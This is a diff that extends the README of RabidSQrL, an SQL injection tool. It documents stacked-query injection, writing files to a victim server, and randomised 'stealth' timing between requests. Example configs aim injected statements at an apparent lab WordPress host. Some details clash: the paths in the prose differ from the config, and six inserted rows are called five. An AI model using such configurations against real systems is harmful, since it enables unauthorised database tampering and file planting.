@@ -1,19 +1,160 @@
 RabidSQrL is an SQL injection attack tool. 
 ------------------------------------------
 
+It requires python3. 
+
 Degrees of freedom in RabidSQrl are:
-- Number of hosts from which to attack.
 - Types of SQL Injection attacks to perform.
+- Injection interval function.
 
 The main configuration file, rabidsqrl.conf, describes the types and
 targets of the attacks.
 
 Currently supported attacks:
-- None
-
-To be supported attacks:
+- Direct injection
 - Stacked Queries
 - Move file from attacker path to victim path via database manipulation
+
+To be supported attacks:
 - Per application second order SQL Injection
     - Wordpress
     - Simple Machines Forum (SMF)
+- Other possible attacks to add
+    - Boolean-based blind SQL injection
+    - Error-based SQL injection
+    - UNION query SQL injection
+    - Time-based blind SQL injection
+    - Database stored procedure attacks
+    - Application extenstion attacks
+
+Installation:
+-------------
+Rabidsqrl is installed via standard python distutils methods.
+
+> sudo python3 setup.py install
+
+Running:
+--------
+rabidsqrl is invoked via loading it as a python3 module.
+
+> python3 -m rabidsqrl --help
+
+> python3 -m rabidsqrl -c /tmp/my-attack.conf -l info
+
+
+Configuration File 
+------------------------------------------
+Rabidsqrl is driven by its configuration file. This
+section describes the defined configuration parameters.
+
+The configuration file is JSON. (Note JSON does not allow inline 
+comments so the format may be changed to YAML or INI format
+in the future.
+
+The basic file format is a list of dictionaries. Each dictionary
+describes a single attack. For example, here is a configuration file
+with two attacks:
+
+[
+    {
+        attack one details
+    },
+    {
+        attack two details
+    }
+]
+
+
+Configuration Entries:
+---------------------
+This section gives deatils on the allowed entries in the attack dictionary
+section of a configuration files. Examples will follow.
+
+"base_url" - The portion of the attack URL which does
+    not change. The path to the file on the server which contains
+    the vulnerability.
+
+"attack" - The type of attack to launch. Currently must be "sqlinjection". 
+
+"attribute" - The attribute of the url which is vulnerable to attack.
+
+"database" - The type of database used on the server. Currently only "mysql"
+    is supported, but "postgres" and others will be added. Database detection
+    may be added in the future if needed although the user can just use
+    sqlmap for database detection now.
+
+"statements" - The SQL statements to inject. This is required if the attack
+    is sqlinjection. This is a list of SQL statements that will be executed
+    on the "host". 
+    Example:
+        "statements": [
+            "create table olive(data text) --",
+            "insert into olive(data) values('hello')--"
+            "insert into olive(data) values('world')--"
+            ]
+
+"stealth_interval" - A function which returns a floating point number when called.
+    This function will be called between SQL injection invocations. The function
+    is python code and can assume that the python random module has been imported.
+    Examples:
+        "10" - always wait 10 seconds
+        "random.normalvariate(5, 1.8)+3" - normal distribution centered on 5 w/a 
+            standard deviation of 1.8 seconds - then add 3 to that.
+        "random.choice([1,2,5,6])" - one of 1, 2, 5, or 6 seconds chosen randomly
+        "random.uniform(4, 8)" - some random floating point number between 4 and 8.
+    See the documentation for python's Random module for more details.
+
+"file_write" - The path, on localhost, to a file to write to the server via sql injection.
+
+"file_dest" - Where, on the server, to write the file written via sql injection.
+
+Example Configuration Files:
+----------------------------
+filewrite.conf:
+[
+    {
+        "base_url": "http://wpvuln/wp-login.php",
+        "attack": "sqlinjection",
+        "attribute": "inline",
+        "database": "mysql",
+        "file_write": "/users/glawler/src/acs_attack/rabidsqrl/dist/rabidsqlr-0.0.1.tar.gz",
+        "file_dest": "/tmp/attackfile"
+    }
+]
+
+If given this configuration file, rabidsqrl will write the contents of the file at /tmp/attacktool
+to the file /tmp/thisisnotanattack on the server viv sql injection using the vulnerability at the
+URL http://wpvuln/wp-login.php?inline=foo. 
+
+
+attack.conf
+[
+    {
+        "stealth_interval": "random.normalvariate(5, 1.8)+3",
+        "base_url": "http://wpvuln/wp-login.php",
+        "attack": "sqlinjection",
+        "attribute": "inline",
+        "database": "mysql",
+        "statements": [
+            "create table olive(data text) --",
+            "insert into olive(data) values('hello')--",
+            "insert into olive(data) values('world')--"
+            ]
+    },
+    {
+        "stealth_interval": "random.normalvariate(2, 0.8)*2",
+        "base_url": "http://wpvuln/wp-login.php",
+        "attack": "sqlinjection",
+        "attribute": "inline",
+        "database": "mysql",
+        "statements": [
+            "insert into olive(data) values('foobar')--",
+            "insert into olive(data) values('barfoof')--",
+            "insert into olive(data) values('Aarf')--",
+            ]
+    }
+]
+
+If given this configuration file, rabidsqrl will create the table "olive" in the server's database
+and write the five things shown to it. The first three statements and last three statements will
+be timed using different interval functions. 
